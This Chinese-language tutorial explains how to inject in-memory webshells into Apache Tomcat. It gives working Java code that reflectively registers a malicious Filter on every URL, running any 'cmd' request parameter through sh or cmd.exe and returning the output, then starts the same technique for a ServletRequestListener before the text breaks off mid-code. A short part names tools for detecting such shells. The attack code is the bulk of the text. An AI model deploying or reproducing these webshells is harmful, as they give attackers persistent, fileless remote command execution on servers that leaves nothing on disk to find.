# Tomcat内存马
基础知识：
内存马主要分为以下几类：
  1. servlet-api类
  2. filter型
  3. servlet型
  4. spring类
  5. 拦截器
  6. controller型
  7. Java Instrumentation类
  8. agent型
请求会经过filter到达servlet，动态创建fliter放在最前面，就会命令执行
## 动态注册fliter
具体新建servlet的过程：
新建一个servlet:
    package org.example;
    import javax.servlet.ServletException;
    import javax.servlet.annotation.WebServlet;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    @WebServlet("/servlet")
    public class servlet extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException{
            resp.getWriter().write("hello servlet");
        }
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        }
    }
配置tomcat：应用程序上下文表示http访问servlet的地址，这里就是localhost:8080/servlet
自定义的filter:
    import javax.servlet.*;
    import java.io.IOException;
    public class filterDemo implements Filter {
        public void init(FilterConfig filterConfig) throws ServletException {
            System.out.println("Filter 初始化创建");
        }
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            System.out.println("执行过滤操作");
           filterChain.doFilter(servletRequest,servletResponse);
        }
        public void destroy() {}
    }
修改web.xml，指定url-pattern为`/demo`，也就是访问
        filterDemo
        org.example.filterDemo
        filterDemo
        /demo
分析之前在项目结构->模块->依赖里导入tomcat/lib的包
>
> 如果可以把自己创建的FilterMap放在FilterMaps的最前面，urlpattern匹配到的时候，就能把恶意FilterConfig添加到FilterChain中，然后触发shell
filterChain来自creatFilterChain
**FilterDefs** ：存放FilterDef的数组 ， **FilterDef** 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息
**FilterConfigs** ：存放filterConfig的数组，在 **FilterConfig** 中主要存放 FilterDef 和
Filter对象等信息
**FilterMaps** ：存放FilterMap的数组，在 **FilterMap** 中主要存放了 FilterName 和
对应的URLPattern
## 容器组件
  * servletContext和StandardContext的关系
Tomcat中ServletContext实现类为ApplicationContext。ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。
由于正常环境不能直接修改web.xml。但是可以通过反射生成恶意filterDefs、filterConfig、filterMaps，三个一起放入Context就起到了web.xml注册一样的效果
要实现filter型内存马，需要经过：
  1. 创建恶意filter
  2. 用filterDef对filter进行封装
  3. 将filterDef添加到filterDefs跟filterConfigs中
  4. 创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中
因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。
每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启。
在Tomcat
7.x以上才支持Servlet3，而java.servlet.DispatcherType类在servlet3才引入。所以filter型内存马需要Tomcat7以上
## 一、Filter内存马
### 1.获取context
servlet提供了request.getSession().getServletContext()获取servletContext
不过该方法直接获取到的是ApplicationContextFacade，它封装了ApplicationContext。然后ApplicationContext封装了StandardContext
> 表达式((RequestFacade)servletRequest).request.getSession().getServletContext()
因此调两次反射就能拿到StandardContext
不过servlet环境的request实际上为RequestFacade对象，它的request属性存储了Request对象，Request对象的getContext能直接拿到Context
    Field requestField = request.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        Request request1 = (Request) requestField.get(request);
        StandardContext standardContext = (StandardContext) request1.getContext();
### 2.添加FilterDefs
FilterDef提供了setFilter来修改filter
然后用StandardContext#addFilterDef()来添加FilterDefs
生成恶意filter:接收cmd作为参数，System.getProperty(os.name)获取系统变量，用来判定系统为Linux or
windows。然后调用Runtime#exec()进行命令执行。
    Filter filter = new Filter() {
        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
            chain.doFilter(request, response);
        }
    };
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("evilFilter");
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);
`Scanner(in).useDelimiter("\\A");`scannner读入所有输入，包括回车和换行符（默认读到空格停止，`\\A`表示以文本开头作为分隔符分割文本)
将output写入response，获取完参数将request和response作为回调参数调用doFilter。
重点在于setFilter修改filter，然后使用standardContext.addFilter()添加FilterDefs
### 3.filterConfig封装filterDefs，并添加到filterConfigs
利用反射获取filterConifigs，filterConfigs实际上是个hashmap，put进去就行了
前面说过了，standardContext实际上是ApplicationFilterConfigContext封装的。
利用ApplicationFilterConfigContext构造函数来封装filterfDefs，不过该构造函数无修饰符，为default（同包可用），使用反射
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
        Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
        filterConfigsField.setAccessible(true);
        Map filterConfigs = (Map) filterConfigsField.get(standardContext);
        filterConfigs.put("evilFilter", filterConfig);
### 4.生成filterMap添加到filterMaps
filterMaps需要设置名称，pattern，dispatcher
这里的dispatcher需要设置为DispatcherType.REQUEST，该选项指定了filter过滤器根据DispatcherType的类型是否执行。这也是为什么需要tomcat7以上的原因
FilterMaps可以用两种方式添加map：addFilterMap 或者addFilterMapBefore()，后者可以将filter添加至最前面
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("evilFilter");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);
将抽象类的方法补全就能用了
完整代码：
    // filterTrojan.jsp
而且不需要指定jsp路径，因为注册的filterMap的pattern为`/*`
## 排查内存马
#### arthas
项目链接：
我们可以利用该项目来检测我们的内存马
    java -jar arthas-boot.jar --telnet-port 9998 --http-port -1
这里也可以直接 `java -jar arthas-boot.jar`
#### copagent
项目链接：
#### java-memshell-scanner
项目链接：
## 二、Listener内存马
Listener用来监听对象创建、销毁、属性增删改，然后执行对应的操作。
在Tomcat中，Listener->Filter->Servlet依次执行。
Tomcat支持两种listener：`org.apache.catalina.LifecycleListener`和`Java.util.EvenListener`,前者一般不能使用
实现了EvenListener的ServletRequestListener可以监听Request请求的创建和销毁（这么好的类当然要拿来做内存马
### ServletRequestListener调用流程
  * request创建时：在servlet doGet方法处打上断点分析，然后get访问webservlet
servlet启动时，在StandardHostValue#invoke()中对监听器进行检查
其中context.fireRequestInitEvent调用getApplicationEventListeners方法获取全部Listener
if判断有Listener并且为ServletRequestListener子类，就调用ServletRequestListener#requestInitialized()方法
  * Request销毁：
在StandardHostValue#invoke()下面，调用fireRequestDistroyEvent()销毁
实际上也就是getApplicationEventListeners方法获取全部Listener后，使用ServletRequestListener#requestDestroyed()方法
由此可见生成Listener只需要经过两个方法，一个是requestInitialized()，一个是requestDestroyed()。这两个方法重写后效果是一样的
  * 构建Listener内存马流程：生成恶意Listener，然后放入Context
### 1.获取context
上文已经介绍了如何获取context，一样的通过反射获取Request，然后获取StandardContext
    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    Request request1 = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) request1.getContext();
### 2.生成恶意Listener
getParameter进行命令执行的地方就不多说了。创建Listener需要执行ServletRequestListener#requestInitialized()，那就new一个ServletRequestListener类然后重写requestInitialized方法。
ServletRequestEvent提供了getServletRequest()方法获取request
上面获取context过程中用到的request1为Request对象，封装了getter获取response
    ServletRequestListener listener = new ServletRequestListener() {
            @Override
            public void requestInitialized(ServletRequestEvent sre) {
                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                HttpServletResponse resp = request1.getResponse();
                if (req.getParameter("cmd") != null) {
                    try {
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\A");
                        String out = s.hasNext()?s.next():"";
                        resp.getWriter().write(out);
                        resp.getWriter().flush();
                    }catch (IOException ioe){
                        ioe.printStackTrace();
                    }
                }